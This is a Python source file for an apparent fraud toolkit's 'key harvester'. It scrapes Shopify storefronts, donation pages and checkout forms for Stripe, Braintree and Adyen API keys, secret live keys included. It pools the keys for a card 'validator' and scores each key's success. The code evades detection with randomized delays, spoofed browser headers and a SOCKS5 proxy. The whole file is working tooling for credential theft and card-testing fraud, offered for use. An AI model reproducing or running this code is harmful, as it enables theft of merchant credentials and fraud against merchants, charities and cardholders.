#!/usr/bin/env python3
"""
Cerberus Key Harvester
Automated discovery of merchant API keys for validation sustainability

Scrapes Shopify, donation sites, and payment forms for public API keys
OPSEC: Low and slow, randomized delays, proxy rotation

Author: Dva.12
"""

import asyncio
import aiohttp
import random
import re
import json
import logging
from typing import List, Dict, Optional
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
import time

logger = logging.getLogger('cerberus.harvester')

class KeyHarvester:
    """
    Automated merchant API key discovery
    
    Targets:
    - Shopify storefronts (pk_live_ keys)
    - Stripe donation forms
    - Braintree payment forms
    - Adyen checkout pages
    
    Maintains a pool of fresh keys for validator rotation
    """
    
    def __init__(self):
        self.merchant_keys = []
        self.harvest_urls = []
        self.session = None
        self.harvesting = False
        self.last_harvest = None
        self.harvest_interval = 3600  # 1 hour between harvests
        self.key_expiry = timedelta(days=7)  # Keys expire after 7 days
        
        # Regex patterns for key discovery
        self.patterns = {
            'stripe': [
                r'pk_live_[a-zA-Z0-9]{24,}',
                r'pk_test_[a-zA-Z0-9]{24,}',
                r'sk_live_[a-zA-Z0-9]{24,}',
                r'sk_test_[a-zA-Z0-9]{24,}'
            ],
            'braintree': [
                r'authorization_fingerprint["\']?\s*:\s*["\']([a-f0-9]{40,})["\']',
                r'client_token["\']?\s*:\s*["\']([a-f0-9]{40,})["\']',
                r'braintree\.client\.create\s*\(\s*["\']([^"\']+)["\']'
            ],
            'adyen': [
                r'clientKey["\']?\s*:\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                r'adyen\.checkout\s*\(\s*{\s*clientKey\s*:\s*["\']([^"\']+)["\']'
            ]
        }
        
    async def initialize(self):
        """Initialize harvester with target URLs and session"""
        await self._load_harvest_urls()
        await self._setup_session()
        await self._load_existing_keys()
        
    async def start_harvesting(self):
        """Start background harvesting loop"""
        if self.harvesting:
            return
            
        self.harvesting = True
        logger.info("Starting key harvester background service")
        
        while self.harvesting:
            try:
                await self._harvest_cycle()
                await asyncio.sleep(self.harvest_interval)
            except Exception as e:
                logger.error(f"Harvest cycle error: {e}")
                await asyncio.sleep(300)  # Wait 5 minutes on error
                
    async def stop_harvesting(self):
        """Stop background harvesting"""
        self.harvesting = False
        logger.info("Key harvester stopped")
        
    async def _harvest_cycle(self):
        """Execute one harvesting cycle"""
        logger.info("Starting harvest cycle")
        
        # Clean expired keys
        await self._clean_expired_keys()
        
        # Harvest new keys if needed
        if len(self.merchant_keys) < 50:  # Maintain minimum pool
            new_keys = await self._harvest_keys()
            if new_keys:
                await self._save_keys()
                logger.info(f"Harvested {len(new_keys)} new keys")
                
        self.last_harvest = datetime.now()
        
    async def _harvest_keys(self) -> List[Dict]:
        """Harvest keys from target URLs"""
        new_keys = []
        
        # Randomize URL order to avoid patterns
        urls = random.sample(self.harvest_urls, min(100, len(self.harvest_urls)))
        
        # Process URLs in batches with delays
        batch_size = 10
        for i in range(0, len(urls), batch_size):
            batch = urls[i:i + batch_size]
            
            tasks = [self._scrape_url(url) for url in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    new_keys.extend(result)
                elif isinstance(result, Exception):
                    logger.debug(f"Scrape error: {result}")
                    
            # Random delay between batches
            await asyncio.sleep(random.uniform(5, 15))
            
        # Deduplicate keys
        unique_keys = []
        seen_keys = set()
        
        for key in new_keys:
            key_signature = f"{key['type']}:{key['key'][:20]}"
            if key_signature not in seen_keys:
                seen_keys.add(key_signature)
                unique_keys.append(key)
                
        return unique_keys
        
    async def _scrape_url(self, url: str) -> List[Dict]:
        """Scrape a single URL for API keys"""
        keys_found = []
        
        try:
            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Extract keys using regex patterns
                    for key_type, patterns in self.patterns.items():
                        for pattern in patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            
                            for match in matches:
                                # Extract full key if needed
                                if isinstance(match, tuple):
                                    full_key = match[0] if match[0] else match[1]
                                else:
                                    full_key = match
                                    
                                # Validate key format
                                if self._validate_key_format(key_type, full_key):
                                    key_info = {
                                        'type': key_type,
                                        'key': full_key,
                                        'source': url,
                                        'harvested_at': datetime.now().isoformat(),
                                        'last_used': None,
                                        'success_rate': 0.0,
                                        'error_count': 0
                                    }
                                    keys_found.append(key_info)
                                    
        except Exception as e:
            logger.debug(f"Failed to scrape {url}: {e}")
            
        return keys_found
        
    def _validate_key_format(self, key_type: str, key: str) -> bool:
        """Validate key format for each payment provider"""
        if key_type == 'stripe':
            return bool(re.match(r'^(pk|sk)_(live|test)_[a-zA-Z0-9]{24,}$', key))
        elif key_type == 'braintree':
            return len(key) >= 40 and all(c in '0123456789abcdef' for c in key.lower())
        elif key_type == 'adyen':
            return len(key) >= 20
        return False
        
    async def _load_harvest_urls(self):
        """Load target URLs for harvesting"""
        # Default URL lists - can be expanded
        self.harvest_urls = [
            # Shopify storefronts (replace with actual targets)
            "https://example-shop.myshopify.com",
            "https://store.example.com",
            
            # Donation platforms
            "https://donate.example.org",
            "https://charity.example.com/donate",
            
            # Common payment form targets
            "https://checkout.example.com",
            "https://payment.example.com",
        ]
        
        # Load additional URLs from file if exists
        try:
            with open('/opt/lucid-empire/data/harvest_urls.txt', 'r') as f:
                additional_urls = [line.strip() for line in f if line.strip()]
                self.harvest_urls.extend(additional_urls)
            logger.info(f"Loaded {len(self.harvest_urls)} harvest URLs")
        except Exception:
            logger.info("Using default harvest URL list")
            
    async def _setup_session(self):
        """Setup aiohttp session with proxy rotation"""
        # Configure connector for proxy support
        connector = aiohttp.TCPConnector(
            limit=20,
            limit_per_host=5,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )
        
        # Get proxy from TITAN network shield
        proxy = await self._get_proxy()
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30),
            headers=self._get_random_headers()
        )
        
    async def _get_proxy(self) -> Optional[str]:
        """Get SOCKS5 proxy from TITAN network shield"""
        try:
            import requests
            response = requests.get('http://localhost:8080/api/proxy', timeout=5)
            if response.status_code == 200:
                proxy_data = response.json()
                return f"socks5://{proxy_data['host']}:{proxy_data['port']}"
        except Exception:
            pass
        return None
        
    def _get_random_headers(self) -> Dict[str, str]:
        """Generate random browser headers"""
        user_agents = [
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
    async def _load_existing_keys(self):
        """Load existing merchant keys from storage"""
        try:
            with open('/opt/lucid-empire/data/merchant_keys.json', 'r') as f:
                self.merchant_keys = json.load(f)
            logger.info(f"Loaded {len(self.merchant_keys)} existing keys")
        except Exception as e:
            logger.warning(f"Could not load existing keys: {e}")
            self.merchant_keys = []
            
    async def _save_keys(self):
        """Save merchant keys to storage"""
        try:
            import os
            os.makedirs('/opt/lucid-empire/data', exist_ok=True)
            
            with open('/opt/lucid-empire/data/merchant_keys.json', 'w') as f:
                json.dump(self.merchant_keys, f, indent=2)
            logger.info(f"Saved {len(self.merchant_keys)} keys to storage")
        except Exception as e:
            logger.error(f"Failed to save keys: {e}")
            
    async def _clean_expired_keys(self):
        """Remove expired or failed keys"""
        now = datetime.now()
        
        # Filter out expired keys
        valid_keys = []
        for key in self.merchant_keys:
            harvested_at = datetime.fromisoformat(key['harvested_at'])
            
            # Remove if expired or too many errors
            if (now - harvested_at) < self.key_expiry and key['error_count'] < 5:
                valid_keys.append(key)
                
        self.merchant_keys = valid_keys
        logger.info(f"Cleaned keys: {len(valid_keys)} valid keys remaining")
        
    async def load_keys(self):
        """Public method to load keys for validator"""
        if not self.merchant_keys:
            await self._load_existing_keys()
            
    def get_keys(self) -> List[Dict]:
        """Get current key pool for validator"""
        return self.merchant_keys.copy()
        
    async def update_key_performance(self, key_type: str, key: str, success: bool):
        """Update key performance metrics"""
        for key_info in self.merchant_keys:
            if key_info['type'] == key_type and key_info['key'] == key:
                if success:
                    # Update success rate
                    key_info['success_rate'] = (key_info['success_rate'] * 0.9) + (1.0 * 0.1)
                    key_info['last_used'] = datetime.now().isoformat()
                else:
                    key_info['error_count'] += 1
                    key_info['success_rate'] = key_info['success_rate'] * 0.9
                break
                
        # Save updated metrics
        await self._save_keys()
        
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        await self.stop_harvesting()
